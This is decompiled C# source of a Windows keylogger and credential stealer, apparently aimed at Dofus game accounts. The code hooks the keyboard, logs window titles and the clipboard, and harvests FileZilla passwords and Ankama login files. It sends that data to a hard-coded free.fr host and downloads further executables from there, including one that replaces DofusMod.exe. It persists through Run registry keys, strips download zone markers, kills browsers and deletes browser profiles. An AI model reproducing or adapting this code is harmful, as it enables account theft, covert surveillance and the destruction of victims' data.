			Kc.Add(255);
		}

		public object Hooked()
		{
			return KeyboardHandle != (IntPtr)0;
		}

		public int KeyboardCallback(int Code, int wParam, ref KBDLLHOOKSTRUCT lParam)
		{
			KeyLogApp = "";
			string activeWindowTitle = GetActiveWindowTitle();
			if (Operators.CompareString(activeWindowTitle, LastCheckedForegroundTitle, false) != 0)
			{
				LastCheckedForegroundTitle = activeWindowTitle;
				KeyLogApp = "\r\n\r\nAPP : " + activeWindowTitle + " (" + DateAndTime.get_Now().ToString() + ")\r\n";
			}
			string text = "";
			if ((wParam == WM_KEYDOWN) | (wParam == WM_SYSKEYDOWN))
			{
				switch (lParam.vkCode)
				{
				case 20:
					if (!CapsT)
					{
						Caps = !Caps;
					}
					CapsT = true;
					break;
				case 91:
					Lwin = true;
					break;
				case 92:
					RWin = true;
					break;
				case 160:
					LShft = true;
					break;
				case 161:
					RShft = true;
					break;
				case 162:
					RCtrl = true;
					break;
				case 163:
					LCtrl = true;
					break;
				case 164:
					Alt = true;
					break;
				case 165:
					AltGr = true;
					break;
				}
			}
			if ((wParam == WM_KEYUP) | (wParam == WM_SYSKEYUP))
			{
				switch (lParam.vkCode)
				{
				case 20:
					CapsT = false;
					break;
				case 91:
					Lwin = false;
					break;
				case 92:
					RWin = false;
					break;
				case 160:
					LShft = false;
					break;
				case 161:
					RShft = false;
					break;
				case 162:
					RCtrl = false;
					break;
				case 163:
					LCtrl = false;
					break;
				case 164:
					Alt = false;
					if (Acde.Length > 0)
					{
						int a = Conversions.ToInteger(Acde);
						int result;
						if (Operators.CompareString(Conversions.ToString(Acde[0]), "0", false) == 0)
						{
							Math.DivRem(a, 256, out result);
							text = AsciiT[result + 256, 1];
						}
						else
						{
							Math.DivRem(a, 256, out result);
							text = AsciiT[result, 1];
						}
					}
					Acde = "";
					break;
				case 165:
					AltGr = false;
					break;
				}
			}
			Ctrl = LCtrl | RCtrl;
			Shft = LShft | RShft;
			Win = Lwin | RWin;
			if (Ctrl & Alt)
			{
				AltGr = true;
			}
			if ((wParam == WM_KEYDOWN) | (wParam == WM_SYSKEYDOWN))
			{
				bool capsLock = ((Computer)MyProject.MyComputer_0).get_Keyboard().get_CapsLock();
				if (!Ctrl & !Alt & !Shft & !Win & !AltGr)
				{
					text = ((!capsLock) ? Kc[lParam.vkCode].Ret_Base : Kc[lParam.vkCode].Ret_Shft);
				}
				if (Ctrl & !Alt & !Shft & !Win & !AltGr)
				{
					text = Kc[lParam.vkCode].Ret_Ctrl;
				}
				if (!Ctrl & !Alt & Shft & !Win & !AltGr)
				{
					text = ((!capsLock) ? Kc[lParam.vkCode].Ret_Shft : Kc[lParam.vkCode].Ret_Base);
				}
				if (AltGr & (Ctrl | Alt) & !Win & !Shft)
				{
					text = Kc[lParam.vkCode].Ret_AltGr;
				}
				if (Win & !Ctrl & !Shft & !Alt & !AltGr)
				{
					text = Kc[lParam.vkCode].Ret_Win;
				}
				if (Alt & !Ctrl & !Shft & !AltGr & !Win)
				{
					string ret_Base = Kc[lParam.vkCode].Ret_Base;
					if (ret_Base.Length != 0 && ((Strings.Asc(ret_Base) >= 48) & (Strings.Asc(ret_Base) <= 57)) && Alt)
					{
						Acde += ret_Base;
					}
					text = Kc[lParam.vkCode].Ret_Alt;
				}
				if (Acct != 0)
				{
					text = GetAccent(text, lParam.vkCode, Kc[lParam.vkCode].Ret_AccTrans);
				}
				if ((Operators.CompareString(text, "^", false) == 0) | (Operators.CompareString(text, "\u00a8", false) == 0) | (Operators.CompareString(text, "~", false) == 0) | (Operators.CompareString(text, "`", false) == 0))
				{
					Acct = Conversions.ToChar(text);
					text = "";
				}
			}
			KeyLog = KeyLog + KeyLogApp + text;
			return CallNextHookEx((int)KeyboardHandle, Code, wParam, lParam);
		}

		private string GetAccent(string Skey, int Code, int Ac)
		{
			string[,] array = new string[12, 4]
			{
				{ "â", "ä", "ã", "à" },
				{ "ê", "ë", "~e", "è" },
				{ "î", "ï", "~i", "ì" },
				{ "ô", "ö", "õ", "ò" },
				{ "û", "ü", "~u", "ù" },
				{ "Â", "Ä", "Ã", "À" },
				{ "Ê", "Ë", "~E", "È" },
				{ "Î", "Ï", "~I", "Ì" },
				{ "Ô", "Ö", "Õ", "Ò" },
				{ "Û", "Ü", "~U", "Ù" },
				{ "^n", "\u00a8n", "ñ", "`n" },
				{ "^N", "\u00a8N", "Ñ", "`N" }
			};
			if ((Operators.CompareString(Skey, "^", false) == 0) | (Operators.CompareString(Skey, "\u00a8", false) == 0) | (Operators.CompareString(Skey, "~", false) == 0) | (Operators.CompareString(Skey, "`", false) == 0))
			{
				string result = Conversions.ToString(Acct) + Skey;
				Acct = '\0';
				return result;
			}
			int num = default(int);
			switch (Acct)
			{
			case '^':
				num = 0;
				break;
			case '\u00a8':
				num = 1;
				break;
			case '~':
				num = 2;
				break;
			case '`':
				num = 3;
				break;
			}
			switch (Ac)
			{
			case 0:
				return Skey;
			case 1:
			{
				string result2 = Conversions.ToString(Acct) + Skey;
				Acct = '\0';
				return result2;
			}
			case 2:
				switch (Skey)
				{
				case "a":
					Acct = '\0';
					return array[0, num];
				case "e":
					Acct = '\0';
					return array[1, num];
				case "i":
					Acct = '\0';
					return array[2, num];
				case "o":
					Acct = '\0';
					return array[3, num];
				case "u":
					Acct = '\0';
					return array[4, num];
				case "A":
					Acct = '\0';
					return array[5, num];
				case "E":
					Acct = '\0';
					return array[6, num];
				case "I":
					Acct = '\0';
					return array[7, num];
				case "O":
					Acct = '\0';
					return array[8, num];
				case "U":
					Acct = '\0';
					return array[9, num];
				case "n":
					Acct = '\0';
					return array[10, num];
				case "N":
					Acct = '\0';
					return array[11, num];
				}
				break;
			}
			return "";
		}

		private string GetActiveWindowTitle()
		{
			string lpString = new string('\0', 100);
			GetWindowTextA(GetForegroundWindow(), ref lpString, 100);
			return lpString.Substring(0, Strings.InStr(lpString, "\0", (CompareMethod)0) - 1);
		}

		public void UnhookKeyboard()
		{
			if (UnhookWindowsHookEx((int)KeyboardHandle) != 0)
			{
				KeyboardHandle = (IntPtr)0;
			}
		}

		public void HookKeyboard()
		{
			callback = KeyboardCallback;
			KeyboardHandle = (IntPtr)SetWindowsHookExA(13, callback, (int)Process.GetCurrentProcess().MainModule!.BaseAddress, 0);
		}
	}

	private IContainer icontainer_0;

	[AccessedThroughProperty("Timer1")]
	private Timer timer_0;

	[AccessedThroughProperty("Timer2")]
	private Timer timer_1;

	[AccessedThroughProperty("Timer4")]
	private Timer timer_2;

	[AccessedThroughProperty("Timer5")]
	private Timer timer_3;

	[AccessedThroughProperty("Timer3")]
	private Timer timer_4;

	private RichTextBox richTextBox_0;

	private string string_0;

	private string string_1;

	private string string_2;

	private string string_3;

	private string string_4;

	private string string_5;

	private string string_6;

	private string string_7;

	private string string_8;

	private string string_9;

	private string string_10;

	private string string_11;

	private string string_12;

	private string string_13;

	private string string_14;

	private string string_15;

	private string string_16;

	private string string_17;

	private string string_18;

	private string string_19;

	private string string_20;

	private string string_21;

	private string string_22;

	private bool bool_0;

	private string string_23;

	private fonc fonc_0;

	internal virtual Timer Timer_0
	{
		[DebuggerNonUserCode]
		get
		{
			return timer_0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer_0_Tick;
			if (timer_0 != null)
			{
				timer_0.remove_Tick(eventHandler);
			}
			timer_0 = value;
			if (timer_0 != null)
			{
				timer_0.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer_1
	{
		[DebuggerNonUserCode]
		get
		{
			return timer_1;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer_1_Tick;
			if (timer_1 != null)
			{
				timer_1.remove_Tick(eventHandler);
			}
			timer_1 = value;
			if (timer_1 != null)
			{
				timer_1.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer_2
	{
		[DebuggerNonUserCode]
		get
		{
			return timer_2;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer_2_Tick;
			if (timer_2 != null)
			{
				timer_2.remove_Tick(eventHandler);
			}
			timer_2 = value;
			if (timer_2 != null)
			{
				timer_2.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer_3
	{
		[DebuggerNonUserCode]
		get
		{
			return timer_3;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer_3_Tick;
			if (timer_3 != null)
			{
				timer_3.remove_Tick(eventHandler);
			}
			timer_3 = value;
			if (timer_3 != null)
			{
				timer_3.add_Tick(eventHandler);
			}
		}
	}

	internal virtual Timer Timer_4
	{
		[DebuggerNonUserCode]
		get
		{
			return timer_4;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[DebuggerNonUserCode]
		set
		{
			EventHandler eventHandler = Timer_4_Tick;
			if (timer_4 != null)
			{
				timer_4.remove_Tick(eventHandler);
			}
			timer_4 = value;
			if (timer_4 != null)
			{
				timer_4.add_Tick(eventHandler);
			}
		}
	}

	public Form1()
	{
		//IL_002d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0037: Expected O, but got Unknown
		((Control)this).add_Leave((EventHandler)Form1_Leave);
		((Form)this).add_Load((EventHandler)Form1_Load);
		richTextBox_0 = new RichTextBox();
		string_20 = Conversions.ToString(2);
		string_22 = "Cyerbeau";
		string_23 = Conversions.ToString(0);
		fonc_0 = new fonc();
		InitializeComponent();
	}

	[STAThread]
	public static void Main()
	{
		Application.Run((Form)(object)MyProject.MyForms_0.Form1);
	}

	[DebuggerNonUserCode]
	protected override void vmethod_0(bool bool_1)
	{
		try
		{
			if (bool_1 && icontainer_0 != null)
			{
				icontainer_0.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(bool_1);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		//IL_0022: Unknown result type (might be due to invalid IL or missing references)
		//IL_002c: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		//IL_0044: Unknown result type (might be due to invalid IL or missing references)
		//IL_004e: Expected O, but got Unknown
		//IL_0055: Unknown result type (might be due to invalid IL or missing references)
		//IL_005f: Expected O, but got Unknown
		//IL_0066: Unknown result type (might be due to invalid IL or missing references)
		//IL_0070: Expected O, but got Unknown
		//IL_011c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0126: Expected O, but got Unknown
		icontainer_0 = new Container();
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		Timer_0 = new Timer(icontainer_0);
		Timer_1 = new Timer(icontainer_0);
		Timer_2 = new Timer(icontainer_0);
		Timer_3 = new Timer(icontainer_0);
		Timer_4 = new Timer(icontainer_0);
		((Control)this).SuspendLayout();
		Timer_0.set_Interval(1);
		Timer_1.set_Interval(1000);
		Timer_2.set_Enabled(true);
		Timer_2.set_Interval(10000);
		Timer_3.set_Interval(5000);
		Timer_4.set_Interval(60000);
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_BackColor(Color.Black);
		Size clientSize = new Size(0, 0);
		((Form)this).set_ClientSize(clientSize);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Form)this).set_Text("Null");
		((Form)this).set_WindowState((FormWindowState)1);
		((Control)this).ResumeLayout(false);
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		Mutex mutex = new Mutex(initiallyOwned: true, "JeSuisUneDanseuseEtoile");
		try
		{
			mutex.ReleaseMutex();
			mutex.WaitOne();
			method_7();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			((Form)this).Close();
			ProjectData.ClearProjectError();
		}
	}

	private void Form1_Leave(object sender, EventArgs e)
	{
		fonc_0.UnhookKeyboard();
		Timer_0.set_Enabled(false);
	}

	private void Timer_0_Tick(object sender, EventArgs e)
	{
		RichTextBox val = richTextBox_0;
		val.set_Text(val.get_Text() + fonc_0.KeyLog);
		fonc_0.KeyLog = "";
	}

	private void Timer_1_Tick(object sender, EventArgs e)
	{
		//IL_0087: Unknown result type (might be due to invalid IL or missing references)
		//IL_008d: Expected O, but got Unknown
		//IL_00f7: Unknown result type (might be due to invalid IL or missing references)
		//IL_00fd: Invalid comparison between Unknown and I4
		string_23 = Conversions.ToString(Conversions.ToDouble(string_23) + 1.0);
		if (!(Conversions.ToDouble(string_23) > 295.0))
		{
			return;
		}
		if ((Operators.CompareString(richTextBox_0.get_Text(), "", false) == 0) | (Operators.CompareString(richTextBox_0.get_Text(), (string)null, false) == 0))
		{
			string_23 = Conversions.ToString(0);
			return;
		}
		try
		{
			string text = richTextBox_0.get_Text();
			WebBrowser val = new WebBrowser();
			string uriString = "http://heavencorp.free.fr/mylogs.php?to=" + string_22 + "&name=" + ((ServerComputer)MyProject.MyComputer_0).get_Name() + "&os=" + ((ServerComputer)MyProject.MyComputer_0).get_Info().get_OSFullName();
			val.Navigate(new Uri(uriString));
			while ((int)val.get_ReadyState() != 4)
			{
				Application.DoEvents();
			}
			if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\FileZilla\\sitemanager.xml"))
			{
				text = Conversions.ToString(Operators.AddObject((object)text, method_10()));
			}
			if (Operators.ConditionalCompareObjectNotEqual(method_4(), (object)string_15, false))
			{
				text = Conversions.ToString(Operators.AddObject((object)text, Operators.ConcatenateObject((object)"\r\n\r\nPresse Papier : ", method_4())));
				string_15 = Conversions.ToString(method_4());
			}
			val.get_Document().GetElementById("logs").SetAttribute("Value", Conversions.ToString(Operators.ConcatenateObject((object)string.Concat(text + "\r\n", "\r\n"), method_5())));
			val.get_Document().GetElementById("submit").InvokeMember("Click");
			richTextBox_0.set_Text((string)null);
			string_23 = Conversions.ToString(0);
			string_18 = Conversions.ToString(Conversions.ToDouble(string_18) + 1.0);
			if (Conversions.ToDouble(string_18) == 5.0)
			{
				Application.Restart();
				((Form)this).Close();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			Application.Restart();
			((Form)this).Close();
			ProjectData.ClearProjectError();
		}
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	public bool method_0(string string_24)
	{
		bool result = false;
		if (Strings.StrComp(string_24, (string)null, (CompareMethod)1) == 1 && Strings.StrComp(FileSystem.Dir(string_24, (FileAttribute)0), (string)null, (CompareMethod)1) == 1)
		{
			result = true;
		}
		return result;
	}

	private bool method_1(string string_24)
	{
		HttpWebRequest httpWebRequest = null;
		HttpWebResponse httpWebResponse = null;
		try
		{
			httpWebRequest = (HttpWebRequest)WebRequest.Create(string_24);
			httpWebResponse = (HttpWebResponse)httpWebRequest.GetResponse();
			httpWebRequest.Abort();
			if (httpWebResponse.StatusCode == HttpStatusCode.OK)
			{
				return true;
			}
			return false;
		}
		catch (WebException projectError)
		{
			ProjectData.SetProjectError((Exception)projectError);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			bool result = false;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private void method_2()
	{
		try
		{
			if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\Internet Explorer\\UserData"))
			{
				((ServerComputer)MyProject.MyComputer_0).get_FileSystem().DeleteDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Microsoft\\Internet Explorer\\UserData", (DeleteDirectoryOption)5);
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox"))
			{
				((ServerComputer)MyProject.MyComputer_0).get_FileSystem().DeleteDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Mozilla\\Firefox", (DeleteDirectoryOption)5);
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera\\Opera"))
			{
				((ServerComputer)MyProject.MyComputer_0).get_FileSystem().DeleteDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Opera\\Opera", (DeleteDirectoryOption)5);
			}
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default"))
			{
				((ServerComputer)MyProject.MyComputer_0).get_FileSystem().DeleteDirectory(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Google\\Chrome\\User Data\\Default", (DeleteDirectoryOption)5);
			}
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\AnkamaCertificates\\v2-RELEASE"))
			{
				((ServerComputer)MyProject.MyComputer_0).get_FileSystem().DeleteDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\AnkamaCertificates\\v2-RELEASE", (DeleteDirectoryOption)5);
			}
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			ProjectData.ClearProjectError();
		}
	}

	private void method_3()
	{
		string path = Application.get_StartupPath() + "\\date.ini";
		Timer_4.Start();
		try
		{
			DateTime dateTime = DateAndTime.DateValue(Conversions.ToString(DateAndTime.get_Now()));
			if (File.Exists(path))
			{
				string text = File.ReadAllText(path);
				if (text.Contains(Conversions.ToString(dateTime)))
				{
					return;
				}
				File.AppendAllText(path, Conversions.ToString(dateTime));
			}
			else
			{
				File.AppendAllText(path, Conversions.ToString(dateTime));
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		Process[] processesByName = Process.GetProcessesByName("firefox");
		foreach (Process process in processesByName)
		{
			process.Kill();
		}
		Process[] processesByName2 = Process.GetProcessesByName("iexplorer");
		foreach (Process process2 in processesByName2)
		{
			process2.Kill();
		}
		Process[] processesByName3 = Process.GetProcessesByName("chrome");
		foreach (Process process3 in processesByName3)
		{
			process3.Kill();
		}
		Process[] processesByName4 = Process.GetProcessesByName("opera");
		foreach (Process process4 in processesByName4)
		{
			process4.Kill();
		}
		Process[] processesByName5 = Process.GetProcessesByName("DofusMod");
		foreach (Process process5 in processesByName5)
		{
			process5.Kill();
		}
		Process[] processesByName6 = Process.GetProcessesByName("Dofus");
		foreach (Process process6 in processesByName6)
		{
			process6.Kill();
		}
		Timer_3.set_Enabled(true);
	}

	private void Timer_2_Tick(object sender, EventArgs e)
	{
		method_3();
		Timer_2.set_Enabled(false);
	}

	private void Timer_3_Tick(object sender, EventArgs e)
	{
		method_2();
		Timer_3.set_Enabled(false);
	}

	private object method_4()
	{
		return ((Computer)MyProject.MyComputer_0).get_Clipboard().GetText();
	}

	public object method_5()
	{
		string text = null;
		try
		{
			int num = default(int);
			if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Dofus2\\Module_Ankama_Connection.dat"))
			{
				string[] array = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Dofus2\\Module_Ankama_Connection.dat").Split(new char[1] { 'n' });
				text += "NDC :";
				string[] array2 = array;
				for (int i = 0; i < array2.Length; i++)
				{
					if (num > 0)
					{
						if (num > 1)
						{
							text += "n";
						}
						text += array[num];
					}
					num++;
				}
				text += "\r\n";
			}
			if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Dofus 2\\Module_Ankama_Connection.dat"))
			{
				string[] array = File.ReadAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Dofus 2\\Module_Ankama_Connection.dat").Split(new char[1] { 'n' });
				text += "NDC :";
				string[] array3 = array;
				for (int j = 0; j < array3.Length; j++)
				{
					if (num > 0)
					{
						if (num > 1)
						{
							text += "n";
						}
						text += array[num];
					}
					num++;
				}
				return text + "\r\n";
			}
			return text;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			object result = null;
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private void method_6()
	{
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\launcher.exe"))
			{
				((ServerComputer)MyProject.MyComputer_0).get_Network().DownloadFile("http://heavencorp.free.fr/dwn/launcher.txt", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\launcher.exe");
				method_8();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (!File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\launcher.exe"))
			{
				((ServerComputer)MyProject.MyComputer_0).get_Network().DownloadFile("http://heavencorp.free.fr/dwn/launcher.txt", Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\launcher.exe");
			}
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\Dofus2\\app"))
			{
				File.Move(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\Dofus2\\app\\DofusMod.exe", Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\Dofus2\\app\\save.ini");
				((ServerComputer)MyProject.MyComputer_0).get_Network().DownloadFile("http://heavencorp.free.fr/dwn/DofusMod.txt", Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + "\\Dofus2\\app\\DofusMod.exe");
			}
			else if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + " (x86)\\Dofus2\\app"))
			{
				File.Move(Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + " (x86)\\Dofus2\\app\\DofusMod.exe", Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + " (x86)\\Dofus2\\app\\save.ini");
				((ServerComputer)MyProject.MyComputer_0).get_Network().DownloadFile("http://heavencorp.free.fr/dwn/DofusMod.txt", Environment.GetFolderPath(Environment.SpecialFolder.ProgramFiles) + " (x86)\\Dofus2\\app\\DofusMod.exe");
			}
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
		try
		{
			method_9(string_12, "updater");
		}
		catch (Exception projectError4)
		{
			ProjectData.SetProjectError(projectError4);
			ProjectData.ClearProjectError();
		}
		try
		{
			Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run").SetValue("updater", string_12);
		}
		catch (Exception projectError5)
		{
			ProjectData.SetProjectError(projectError5);
			ProjectData.ClearProjectError();
		}
		try
		{
			Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run").SetValue("updater", string_12);
		}
		catch (Exception projectError6)
		{
			ProjectData.SetProjectError(projectError6);
			ProjectData.ClearProjectError();
		}
	}

	private void method_7()
	{
		try
		{
			((Control)this).Hide();
			string_12 = Path.GetTempPath() + "updater.exe";
			if (((ServerComputer)MyProject.MyComputer_0).get_FileSystem().FileExists(string_12))
			{
				if (!File.Exists(Application.get_StartupPath() + "\\date.ini"))
				{
					method_6();
				}
				bool_0 = method_1("http://heavencorp.free.fr/");
				fonc_0.HookKeyboard();
				Timer_0.set_Enabled(true);
				Timer_1.set_Interval(1000);
				Timer_1.Start();
				Timer_2.set_Interval(10000);
				Timer_2.Start();
			}
			else
			{
				File.Move(Application.get_ExecutablePath(), string_12);
				Process.Start(string_12);
				((Form)this).Close();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private void method_8()
	{
		try
		{
			method_9(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\launcher.exe", "launcher");
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
		try
		{
			Registry.CurrentUser.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run").SetValue("launcher", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\launcher.exe");
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			ProjectData.ClearProjectError();
		}
		try
		{
			Registry.LocalMachine.CreateSubKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run").SetValue("launcher", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\launcher.exe");
		}
		catch (Exception projectError3)
		{
			ProjectData.SetProjectError(projectError3);
			ProjectData.ClearProjectError();
		}
	}

	private void method_9(string string_24, string string_25)
	{
		try
		{
			Process process = new Process();
			ProcessStartInfo processStartInfo = new ProcessStartInfo();
			processStartInfo.FileName = "cmd";
			processStartInfo.RedirectStandardInput = true;
			processStartInfo.RedirectStandardOutput = true;
			processStartInfo.UseShellExecute = false;
			processStartInfo.CreateNoWindow = true;
			process.StartInfo = processStartInfo;
			process.Start();
			StreamReader standardOutput = process.StandardOutput;
			StreamWriter standardInput = process.StandardInput;
			standardInput.WriteLine("cd " + string_24);
			standardInput.WriteLine("FOR /R %I IN (*" + string_25 + "*) DO > %I:Zone.Identifier ECHO.");
			standardInput.WriteLine("exit");
			Console.WriteLine(standardOutput.ReadToEnd());
			standardInput.Close();
			standardOutput.Close();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	private object method_10()
	{
		StreamReader streamReader = new StreamReader(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\FileZilla\\sitemanager.xml");
		string text = null;
		string text2 = streamReader.ReadLine();
		text = "\r\n\r\n//// FilleZila \\\\\\\\";
		while (text2 != null)
		{
			if (text2.Contains("Host"))
			{
				text = text + "\r\n\r\n" + text2 + "\r\n";
			}
			if (text2.Contains("Port"))
			{
				text = text + text2 + "\r\n";
			}
			if (text2.Contains("User"))
			{
				text = text + text2 + "\r\n";
			}
			if (text2.Contains("Pass"))
			{
				text = text + text2 + "\r\n";
			}
			text2 = streamReader.ReadLine();
		}
		return text;
	}

	private object method_11(string string_24)
	{
		bool flag = false;
		DirectoryInfo directoryInfo = new DirectoryInfo(string_24);
		FileInfo[] files = directoryInfo.GetFiles("*.*");
		for (int i = 0; i < files.Length; i++)
		{
			flag = true;
		}
		return flag;
	}

	private void Timer_4_Tick(object sender, EventArgs e)
	{
		Timer_4.set_Interval(100);
		try
		{
			if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\AnkamaCertificates\\v2-RELEASE") && Conversions.ToBoolean(method_11(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\AnkamaCertificates\\v2-RELEASE")))
			{
				Process[] processesByName = Process.GetProcessesByName("DofusMod");
				foreach (Process process in processesByName)
				{
					process.Kill();
				}
				Process[] processesByName2 = Process.GetProcessesByName("Dofus");
				foreach (Process process2 in processesByName2)
				{
					process2.Kill();
				}
				((ServerComputer)MyProject.MyComputer_0).get_FileSystem().DeleteDirectory(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\AnkamaCertificates\\v2-RELEASE", (DeleteDirectoryOption)5);
				MyProject.MyForms_0.Dofus.Label1.set_Text("ERROR:\r\nUnable to get value get_hash_code() in get_certificat().\r\n\r\nPlease, contact support for more information.");
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
